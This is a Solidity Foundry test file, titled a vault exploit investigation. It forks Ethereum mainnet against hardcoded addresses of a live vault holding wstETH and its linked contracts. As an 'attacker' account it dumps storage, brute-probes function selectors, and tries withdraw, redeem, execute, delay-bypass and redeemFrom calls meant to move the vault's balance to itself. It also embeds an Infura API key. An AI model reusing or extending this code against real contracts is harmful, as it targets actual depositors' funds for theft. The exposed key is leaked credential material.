// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

/**
 * VAULT CONTRACTS INVESTIGATION
 *
 * NEW FINDING: Vault has contracts at storage slots:
 * - Slot 2: 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a
 * - Slot 5: 0x97c03F52244E60BB18511Cbf03f890D5886f1F47
 * - Slot 6: 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510 (RC)
 */
contract VaultContractsExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // NEW CONTRACTS FROM VAULT STORAGE
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultSlot2Contract() public {
        console.log("=== VAULT SLOT 2 CONTRACT ANALYSIS ===\n");

        address target = VAULT_SLOT2;
        console.log("Target:", target);
        console.log("Code size:", target.code.length);

        // Scan storage
        console.log("\nStorage slots:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Try common functions
        console.log("\nTrying common functions:");

        bytes4[] memory sigs = new bytes4[](20);
        sigs[0] = bytes4(keccak256("owner()"));
        sigs[1] = bytes4(keccak256("admin()"));
        sigs[2] = bytes4(keccak256("paused()"));
        sigs[3] = bytes4(keccak256("vault()"));
        sigs[4] = bytes4(keccak256("asset()"));
        sigs[5] = bytes4(keccak256("withdraw(uint256,address)"));
        sigs[6] = bytes4(keccak256("deposit(uint256,address)"));
        sigs[7] = bytes4(keccak256("redeem(uint256)"));
        sigs[8] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[9] = bytes4(keccak256("authorize(address)"));
        sigs[10] = bytes4(keccak256("setVault(address)"));
        sigs[11] = bytes4(keccak256("execute(address,bytes)"));
        sigs[12] = bytes4(keccak256("call(address,bytes)"));
        sigs[13] = bytes4(keccak256("multicall(bytes[])"));
        sigs[14] = bytes4(keccak256("getRate()"));
        sigs[15] = bytes4(keccak256("rate()"));
        sigs[16] = bytes4(keccak256("totalAssets()"));
        sigs[17] = bytes4(keccak256("controller()"));
        sigs[18] = bytes4(keccak256("redemption()"));
        sigs[19] = bytes4(keccak256("implementation()"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool s, bytes memory d) = target.staticcall(abi.encodeWithSelector(sigs[i]));
            if (s && d.length > 0) {
                console.log("Selector %d works!", i);
                console.logBytes4(sigs[i]);
            }
        }

        // Try calling withdraw
        vm.startPrank(attacker);
        (bool ws,) = target.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("\nwithdraw(1000e18, attacker):", ws);
        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_AnalyzeVaultSlot5Contract() public {
        console.log("=== VAULT SLOT 5 CONTRACT ANALYSIS ===\n");

        address target = VAULT_SLOT5;
        console.log("Target:", target);
        console.log("Code size:", target.code.length);

        // Scan storage
        console.log("\nStorage slots:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Try common functions
        console.log("\nTrying common functions:");

        bytes4[] memory sigs = new bytes4[](20);
        sigs[0] = bytes4(keccak256("owner()"));
        sigs[1] = bytes4(keccak256("admin()"));
        sigs[2] = bytes4(keccak256("paused()"));
        sigs[3] = bytes4(keccak256("vault()"));
        sigs[4] = bytes4(keccak256("asset()"));
        sigs[5] = bytes4(keccak256("withdraw(uint256,address)"));
        sigs[6] = bytes4(keccak256("deposit(uint256,address)"));
        sigs[7] = bytes4(keccak256("redeem(uint256)"));
        sigs[8] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[9] = bytes4(keccak256("authorize(address)"));
        sigs[10] = bytes4(keccak256("setVault(address)"));
        sigs[11] = bytes4(keccak256("execute(address,bytes)"));
        sigs[12] = bytes4(keccak256("call(address,bytes)"));
        sigs[13] = bytes4(keccak256("multicall(bytes[])"));
        sigs[14] = bytes4(keccak256("getRate()"));
        sigs[15] = bytes4(keccak256("rate()"));
        sigs[16] = bytes4(keccak256("totalAssets()"));
        sigs[17] = bytes4(keccak256("controller()"));
        sigs[18] = bytes4(keccak256("redemption()"));
        sigs[19] = bytes4(keccak256("implementation()"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool s, bytes memory d) = target.staticcall(abi.encodeWithSelector(sigs[i]));
            if (s && d.length > 0) {
                console.log("Selector %d works!", i);
                console.logBytes4(sigs[i]);
            }
        }

        // Try calling functions
        vm.startPrank(attacker);

        (bool w1,) = target.call(abi.encodeWithSignature("withdraw(uint256,address)", type(uint256).max, attacker));
        console.log("\nwithdraw(max, attacker):", w1);

        (bool r1,) = target.call(abi.encodeWithSignature("redeem(uint256)", 1000e18));
        console.log("redeem(1000e18):", r1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_CallVaultSlot5AsRedeem() public {
        console.log("=== CALL VAULT SLOT 5 AS REDEEM CONTROLLER ===\n");

        address target = VAULT_SLOT5;
        console.log("Target:", target);

        // What if slot5 is used for redemption logic?
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(target, type(uint256).max);

        // Try redemption functions
        (bool r1,) = target.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("redeem(uint96):", r1);

        (bool r2,) = target.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));
        console.log("redeem(uint256,address):", r2);

        (bool f1,) = target.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("finalizeRedeem:", f1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_VaultDirectWithdrawViaSlot2() public {
        console.log("=== VAULT DIRECT WITHDRAW VIA SLOT 2 ===\n");

        address target = VAULT_SLOT2;

        // Check if target has relationship with Vault
        bytes32 slot0 = vm.load(target, bytes32(uint256(0)));
        console.log("Target slot 0:");
        console.logBytes32(slot0);

        address targetOwner = address(uint160(uint256(slot0)));
        console.log("Target owner:", targetOwner);
        console.log("Is timelock:", targetOwner == 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e);

        // Check if Vault has approved target
        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance:", vaultBal / 1e18, "wstETH");

        // Try to execute through target
        vm.startPrank(attacker);

        bytes memory withdrawFromVault = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            vaultBal
        );

        (bool e1,) = target.call(
            abi.encodeWithSignature("execute(address,bytes)", VAULT, withdrawFromVault)
        );
        console.log("execute(VAULT, transfer):", e1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_FullVaultStorageDump() public {
        console.log("=== FULL VAULT STORAGE DUMP ===\n");

        console.log("Vault:", VAULT);

        // Dump all non-zero slots
        for (uint i = 0; i < 50; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);

                // Decode potential addresses
                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  -> Contract: %s (code: %d bytes)", addr, addr.code.length);
                } else if (addr != address(0)) {
                    console.log("  -> EOA or empty: %s", addr);
                }
            }
        }
    }

    function test_ChainVaultSlot5ToR0() public {
        console.log("=== CHAIN VAULT SLOT5 -> R0 ===\n");

        address slot5 = VAULT_SLOT5;

        // Does slot5 have any relationship with R0?
        bytes32 slot5_slot0 = vm.load(slot5, bytes32(uint256(0)));
        bytes32 slot5_slot1 = vm.load(slot5, bytes32(uint256(1)));
        bytes32 slot5_slot2 = vm.load(slot5, bytes32(uint256(2)));

        console.log("Slot5 contract storage:");
        console.log("  slot0:", address(uint160(uint256(slot5_slot0))));
        console.log("  slot1:", address(uint160(uint256(slot5_slot1))));
        console.log("  slot2:", address(uint160(uint256(slot5_slot2))));

        // Check if any match R0
        console.log("\nR0 address:", R0);
        console.log("R1 address:", R1);
        console.log("RC address:", RC);

        // Try calling slot5 to interact with R0
        vm.startPrank(attacker);

        // What if slot5 can bypass R0's delay?
        (bool s1,) = slot5.call(abi.encodeWithSignature("setDelay(uint256)", 0));
        console.log("slot5.setDelay(0):", s1);

        (bool s2,) = slot5.call(abi.encodeWithSignature("bypass()"));
        console.log("slot5.bypass():", s2);

        (bool s3,) = slot5.call(abi.encodeWithSignature("emergencyRedeem(uint256,address)", 1000e18, attacker));
        console.log("slot5.emergencyRedeem:", s3);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_VaultSlot5ExecuteArbitrary() public {
        console.log("=== VAULT SLOT5 EXECUTE ARBITRARY ===\n");

        address target = VAULT_SLOT5;

        // Check target's code for execute-like patterns
        bytes memory targetCode = target.code;
        console.log("Code size:", targetCode.length);

        // Search for DELEGATECALL (0xF4) and CALL (0xF1)
        uint delegatecallCount = 0;
        uint callCount = 0;

        for (uint i = 0; i < targetCode.length; i++) {
            if (uint8(targetCode[i]) == 0xF4) delegatecallCount++;
            if (uint8(targetCode[i]) == 0xF1) callCount++;
        }

        console.log("DELEGATECALL opcodes:", delegatecallCount);
        console.log("CALL opcodes:", callCount);

        // If there are calls, maybe we can hijack them
        if (callCount > 0 || delegatecallCount > 0) {
            console.log("Target has external call capabilities!");

            // Try to find a function that does external call
            vm.startPrank(attacker);

            // Common patterns
            (bool e1,) = target.call(abi.encodeWithSignature("execute(address,uint256,bytes)", VAULT, 0, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18)));
            console.log("execute(VAULT,0,transfer):", e1);

            (bool e2,) = target.call(abi.encodeWithSignature("executeTransaction(address,uint256,bytes,uint256)", VAULT, 0, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18), 0));
            console.log("executeTransaction:", e2);

            vm.stopPrank();
        }

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ExploitVaultThroughSlot6RC() public {
        console.log("=== EXPLOIT VAULT THROUGH SLOT6 (RC) ===\n");

        // Vault slot 6 = RC
        // What if we can call RC in vault's context?

        address target = RC;

        // RC has redeem(uint256, address) that uses CALLER as recipient
        // Can we somehow make Vault call this?

        deal(TASSET, VAULT, 10000e18);

        // Check if RC can be called to manipulate vault
        vm.startPrank(attacker);

        // What if we approve RC for VAULT's tokens?
        // Can't approve vault's tokens directly...

        // But what if RC has a function that pulls from vault?
        (bool r1,) = target.call(abi.encodeWithSignature("redeemFrom(address,uint256,address)", VAULT, 1000e18, attacker));
        console.log("redeemFrom(VAULT, ...):", r1);

        (bool r2,) = target.call(abi.encodeWithSignature("redeemOnBehalf(address,uint256)", VAULT, 1000e18));
        console.log("redeemOnBehalf(VAULT, ...):", r2);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}
